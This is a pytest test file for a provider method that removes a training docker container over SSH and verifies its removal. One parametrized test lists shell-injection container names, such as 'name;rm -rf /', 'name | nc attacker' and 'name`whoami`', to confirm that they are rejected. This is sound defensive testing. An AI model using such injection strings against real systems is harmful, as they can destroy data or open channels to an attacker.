"""Phase 9.B — :meth:`SingleNodeProvider.cleanup_after_run` contract.

Parity with the in-pod ``PodStopper.podTerminate`` for RunPod: the
orchestrator's stop chain calls this to remove the still-running
training docker container after the trainer subprocess exits.

7-category coverage:

1. **Positive** — docker rm + verify both succeed → Ok.
2. **Negative** — empty / shell-injection container_name rejected
   without touching SSH; no SSH client → Err.
3. **Boundary** — verify command returns empty (container truly
   gone) → Ok; verify returns "<id>" (still listed) → Err.
4. **Invariants** — command shape uses ``docker rm -f ... || true``
   (idempotent); SSH timeout passed through unchanged.
5. **Dependency errors** — SSH transport raises → Err
   (``SSH_TRANSPORT``); docker rm command failed (ok=False) → Err.
6. **Regressions** — verify exception treated as success (rm is the
   source of truth); verification skipped doesn't crash.
7. **Logic-specific** — error codes are stable strings (operator
   alerting / dashboards depend on them).
"""

from __future__ import annotations

from dataclasses import dataclass, field

import pytest

from ryotenkai_providers.single_node.training.provider import SingleNodeProvider
from ryotenkai_providers.training.interfaces import ProviderStatus

# ---------------------------------------------------------------------------
# Fakes
# ---------------------------------------------------------------------------


@dataclass
class _FakeSSHClient:
    """Captures exec_command invocations for assertions."""

    commands: list[tuple[str, float]] = field(default_factory=list)
    rm_result: tuple[bool, str, str] = (True, "", "")
    verify_result: tuple[bool, str, str] = (True, "", "")
    rm_raises: Exception | None = None
    verify_raises: Exception | None = None

    def exec_command(
        self,
        command: str,
        timeout: float = 10.0,
        silent: bool = False,
    ) -> tuple[bool, str, str]:
        self.commands.append((command, timeout))
        if "docker rm -f" in command:
            if self.rm_raises is not None:
                raise self.rm_raises
            return self.rm_result
        if "docker ps -a -q" in command:
            if self.verify_raises is not None:
                raise self.verify_raises
            return self.verify_result
        return (True, "", "")


def _make_provider_with_ssh(ssh: _FakeSSHClient) -> SingleNodeProvider:
    """Build a provider with the SSH client wired in but bypassing
    ``connect()`` — we only need the SSH attached for the stop hook."""
    # ``SingleNodeProvider.__init__`` requires a config + secrets; pass
    # ``__new__`` to skip and inject minimum state.
    provider = SingleNodeProvider.__new__(SingleNodeProvider)
    provider._ssh_client = ssh  # type: ignore[attr-defined]
    provider._status = ProviderStatus.CONNECTED  # type: ignore[attr-defined]
    return provider


# ---------------------------------------------------------------------------
# 1. Positive
# ---------------------------------------------------------------------------


class TestPositive:
    def test_happy_path_removes_and_verifies(self) -> None:
        ssh = _FakeSSHClient(
            rm_result=(True, "", ""),
            verify_result=(True, "", ""),  # empty stdout → container gone
        )
        result = _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_run-1",
        )
        assert result.is_ok()
        # Two commands: rm + verify.
        commands = [c for c, _ in ssh.commands]
        assert any("docker rm -f ryotenkai_training_run-1" in c for c in commands)
        assert any("docker ps -a -q -f name=^ryotenkai_training_run-1$" in c for c in commands)


# ---------------------------------------------------------------------------
# 2. Negative
# ---------------------------------------------------------------------------


class TestNegative:
    def test_no_ssh_client_returns_err(self) -> None:
        provider = SingleNodeProvider.__new__(SingleNodeProvider)
        provider._ssh_client = None  # type: ignore[attr-defined]
        result = provider.cleanup_after_run("ryotenkai_training_x")
        assert result.is_err()
        assert result.unwrap_err().code == "SINGLENODE_CLEANUP_NO_SSH"

    def test_empty_container_name_rejected(self) -> None:
        ssh = _FakeSSHClient()
        result = _make_provider_with_ssh(ssh).cleanup_after_run("")
        assert result.is_err()
        assert result.unwrap_err().code == "SINGLENODE_CLEANUP_INVALID_NAME"
        # SSH never touched.
        assert ssh.commands == []

    @pytest.mark.parametrize("bad_name", [
        "name with space",
        "name;rm -rf /",
        "name && echo pwn",
        "name | nc attacker",
        "name`whoami`",
        "name$VAR",
        "name\nnewline",
    ])
    def test_shell_injection_attempts_rejected(self, bad_name: str) -> None:
        ssh = _FakeSSHClient()
        result = _make_provider_with_ssh(ssh).cleanup_after_run(bad_name)
        assert result.is_err()
        assert result.unwrap_err().code == "SINGLENODE_CLEANUP_INVALID_NAME"
        # SSH never touched — defence in depth.
        assert ssh.commands == []


# ---------------------------------------------------------------------------
# 3. Boundary
# ---------------------------------------------------------------------------


class TestBoundary:
    def test_verify_returns_id_means_container_still_present(self) -> None:
        # docker rm reported success but verify shows the container
        # is still listed by docker ps. We treat as Err because the
        # state contract was violated.
        ssh = _FakeSSHClient(
            rm_result=(True, "", ""),
            verify_result=(True, "abc123\n", ""),  # stdout has container id
        )
        result = _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_run-1",
        )
        assert result.is_err()
        assert result.unwrap_err().code == "SINGLENODE_CLEANUP_VERIFY_FAILED"

    def test_verify_returns_empty_stdout_means_gone(self) -> None:
        # The "happy path" already covers this; explicit boundary test
        # for clarity (empty string stdout).
        ssh = _FakeSSHClient(
            rm_result=(True, "", ""),
            verify_result=(True, "", ""),
        )
        result = _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_run-1",
        )
        assert result.is_ok()


# ---------------------------------------------------------------------------
# 4. Invariants
# ---------------------------------------------------------------------------


class TestInvariants:
    def test_rm_command_uses_idempotent_or_true_pattern(self) -> None:
        # The "|| true" suffix is what makes the call safe to retry —
        # docker rm of a non-existent container returns non-zero, the
        # || true converts that into success at shell level.
        ssh = _FakeSSHClient()
        _make_provider_with_ssh(ssh).cleanup_after_run("ryotenkai_training_x")
        rm_command = ssh.commands[0][0]
        assert "|| true" in rm_command

    def test_ssh_timeout_passed_through(self) -> None:
        ssh = _FakeSSHClient()
        _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_x", ssh_command_timeout=15.0,
        )
        # Both commands respect the override.
        for _, timeout in ssh.commands:
            assert timeout == 15.0

    def test_default_timeout_is_ten_seconds(self) -> None:
        # Plan §9.4 (9.B) explicit number: 10s default.
        ssh = _FakeSSHClient()
        _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_x",
        )
        for _, timeout in ssh.commands:
            assert timeout == 10.0


# ---------------------------------------------------------------------------
# 5. Dependency errors
# ---------------------------------------------------------------------------


class TestDependencyErrors:
    def test_ssh_transport_exception_returns_err(self) -> None:
        ssh = _FakeSSHClient(
            rm_raises=ConnectionError("dns lookup failed"),
        )
        result = _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_x",
        )
        assert result.is_err()
        assert result.unwrap_err().code == "SINGLENODE_CLEANUP_SSH_TRANSPORT"

    def test_docker_rm_returns_failure_propagates_err(self) -> None:
        # exec_command returns (ok=False, ...). Even with || true the
        # SSH layer can mark it failed (shell exit > 0 from the rm
        # itself before || kicks in is impossible, but if docker
        # daemon is down or some other shell error hits, we surface).
        ssh = _FakeSSHClient(
            rm_result=(False, "", "docker daemon not running"),
        )
        result = _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_x",
        )
        assert result.is_err()
        assert result.unwrap_err().code == "SINGLENODE_CLEANUP_DOCKER_RM_FAILED"


# ---------------------------------------------------------------------------
# 6. Regressions
# ---------------------------------------------------------------------------


class TestRegressions:
    def test_verify_exception_treated_as_success(self) -> None:
        # Pin: when rm succeeded but the verify step couldn't run
        # (e.g. SSH closed the channel after rm), trust the rm. The
        # alternative — fail-soft on the verify alone — would cause
        # spurious cleanup-failed alerts.
        ssh = _FakeSSHClient(
            rm_result=(True, "", ""),
            verify_raises=ConnectionError("ssh closed"),
        )
        result = _make_provider_with_ssh(ssh).cleanup_after_run(
            "ryotenkai_training_x",
        )
        assert result.is_ok()


# ---------------------------------------------------------------------------
# 7. Logic-specific
# ---------------------------------------------------------------------------


class TestLogicSpecific:
    @pytest.mark.parametrize("expected_code", [
        "SINGLENODE_CLEANUP_NO_SSH",
        "SINGLENODE_CLEANUP_INVALID_NAME",
        "SINGLENODE_CLEANUP_DOCKER_RM_FAILED",
        "SINGLENODE_CLEANUP_VERIFY_FAILED",
        "SINGLENODE_CLEANUP_SSH_TRANSPORT",
    ])
    def test_error_codes_stable(self, expected_code: str) -> None:
        """Operator alerting / dashboards key off these strings.
        Pin all five so a rename triggers a test failure. (We don't
        test that each appears in a specific scenario — covered
        elsewhere — just that the symbol exists.)"""
        # The codes are inline string literals in the implementation;
        # this test inspects the source for their presence.
        # (Post Phase B packagization: source lives under packages/providers/.)
        from pathlib import Path

        from ryotenkai_providers.single_node.training import provider as _provider_mod

        src_text = Path(_provider_mod.__file__).read_text(encoding="utf-8")
        assert expected_code in src_text, (
            f"error code {expected_code!r} not found in provider source"
        )
